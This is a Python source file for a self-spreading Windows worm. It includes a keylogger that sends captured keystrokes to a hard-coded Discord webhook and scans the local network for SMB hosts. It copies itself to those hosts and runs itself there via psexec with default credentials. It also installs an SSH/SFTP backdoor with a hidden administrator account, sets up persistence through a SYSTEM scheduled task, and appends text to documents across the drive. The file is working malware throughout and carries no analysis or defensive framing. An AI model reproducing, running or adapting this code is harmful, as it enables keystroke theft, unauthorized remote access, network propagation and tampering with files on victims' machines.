import os
import shutil
import socket
import subprocess
import time
import sys
import threading
import random
import string
import base64
import requests
from pynput.keyboard import Listener

# Check if running as .exe (frozen) or .py
is_frozen = getattr(sys, 'frozen', False)
if is_frozen:
    current_file = sys.executable
    extension = '.exe'
else:
    current_file = __file__
    extension = '.py'

# XOR obfuscation for stealth
def xor_string(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))

# Generate random string for file names
def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

# Keylogger with Discord webhook exfiltration
class Keylogger:
    def __init__(self):
        self.log = ""
        self.webhook_url = "https://discord.com/api/webhooks/1360262312577204274//q8HSi0Y5G68BGwHxjGtb7gYxgzhXw5i_OzV8EUISAJT6GvM9j6BYxaOdm1lEGLmrYn7Y"  # Replace with your webhook
        self.log_file = f"C:\\Windows\\Temp\\.{random_string()}.log"
        self.buffer_size = 100  # Send after 100 chars
        self.last_sent = time.time()

    def on_press(self, key):
        try:
            self.log += str(key).replace("'", "")
            if len(self.log) >= self.buffer_size or (time.time() - self.last_sent) > 60:  # Send every 100 chars or 60 seconds
                self.exfiltrate()
        except:
            pass

    def exfiltrate(self):
        if not self.log:
            return
        try:
            # Save to hidden file
            with open(self.log_file, "a") as f:
                encoded_log = base64.b64encode(self.log.encode()).decode()
                f.write(encoded_log + "\n")

            # Prepare Discord payload
            files = None
            data = {"username": random_string(6), "content": "Keylog update"}
            if os.path.getsize(self.log_file) > 1000:  # Send as file if >1KB
                files = {"file": (f"{random_string()}.log", open(self.log_file, "rb"))}
                data["content"] = "Keylog file upload"
            else:
                data["content"] = f"Keylog: {self.log[:1000]}"  # Discord message limit ~2000 chars

            # Send to Discord webhook
            headers = {"User-Agent": random_string(10)}
            requests.post(self.webhook_url, data=data, files=files, headers=headers, timeout=5)

            # Reset log and update timestamp
            self.log = ""
            self.last_sent = time.time()

            # Clear file periodically to avoid large sizes
            if os.path.getsize(self.log_file) > 10000:  # Clear if >10KB
                open(self.log_file, "w").close()

        except:
            pass

    def start(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

def scan_network():
    ip_base = "192.168.1."
    targets = []
    for i in range(1, 255):
        ip = ip_base + str(i)
        try:
            socket.create_connection((ip, 445), timeout=1).close()
            targets.append(ip)
        except:
            pass
    return targets

def copy_to_target(ip):
    global current_file, extension
    try:
        share_path = f"\\\\{ip}\\share"
        fake_name = f"{random_string()}{extension}"
        dest = os.path.join(share_path, fake_name)
        shutil.copyfile(current_file, dest)
        print(f"Copied to {ip} as {fake_name}")
        return fake_name
    except:
        return False

def install_ssh_backdoor():
    try:
        subprocess.run(
            "powershell -c Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; "
            "Start-Service sshd; Set-Service -Name sshd -StartupType Automatic; "
            "New-NetFirewallRule -Name 'SSH' -DisplayName 'SSH' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22",
            shell=True, timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(
            "net user backdoor H@ck3d456 /add && net localgroup Administrators backdoor /add",
            shell=True, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print("SSH backdoor and user 'backdoor' set up on Windows")
    except:
        print("SSH backdoor setup failed")

def install_sftp_backdoor():
    try:
        sshd_config = r"C:\ProgramData\ssh\sshd_config"
        with open(sshd_config, "a") as f:
            f.write("\nSubsystem sftp sftp-server.exe\n")
        subprocess.run("powershell -c Restart-Service sshd", shell=True, timeout=10, stdout=subprocess.DEVNULL)
        print("SFTP enabled on Windows")
    except:
        print("SFTP backdoor setup failed")

def execute_payload():
    root_dir = "C:\\"
    for root, _, files in os.walk(root_dir):
        for file in files:
            if file.endswith((".txt", ".doc")):
                try:
                    with open(os.path.join(root, file), "a") as f:
                        f.write("PWNED_BY_WORM")
                except:
                    pass

def ensure_persistence():
    global current_file, extension
    try:
        fake_task = random_string()
        if is_frozen:
            subprocess.run(
                f'schtasks /create /sc onstart /tn "{fake_task}" /tr "{current_file}" /ru SYSTEM',
                shell=True, timeout=10, stdout=subprocess.DEVNULL
            )
        else:
            subprocess.run(
                f'schtasks /create /sc onstart /tn "{fake_task}" /tr "python {current_file}" /ru SYSTEM',
                shell=True, timeout=10, stdout=subprocess.DEVNULL
            )
        print("Persistence set up")
    except:
        print("Persistence setup failed")

def main():
    # Start keylogger in background
    keylogger = Keylogger()
    threading.Thread(target=keylogger.start, daemon=True).start()
    
    # Run other components
    threading.Thread(target=install_ssh_backdoor, daemon=True).start()
    threading.Thread(target=install_sftp_backdoor, daemon=True).start()
    threading.Thread(target=ensure_persistence, daemon=True).start()
    
    while True:
        targets = scan_network()
        for ip in targets:
            fake_name = copy_to_target(ip)
            if fake_name:
                try:
                    if is_frozen:
                        subprocess.run(
                            f"psexec \\\\{ip} -u admin -p password {fake_name}",
                            shell=True, timeout=10, stdout=subprocess.DEVNULL
                        )
                    else:
                        subprocess.run(
                            f"psexec \\\\{ip} -u admin -p password python {fake_name}",
                            shell=True, timeout=10, stdout=subprocess.DEVNULL
                        )
                except:
                    pass
        execute_payload()
        time.sleep(30)

if __name__ == "__main__":
    # Spoof process name for stealth (simplified for .exe)
    if not is_frozen:
        try:
            subprocess.run("copy NUL svchost.py && python svchost.py", shell=True, stdout=subprocess.DEVNULL)
        except:
            pass
    main()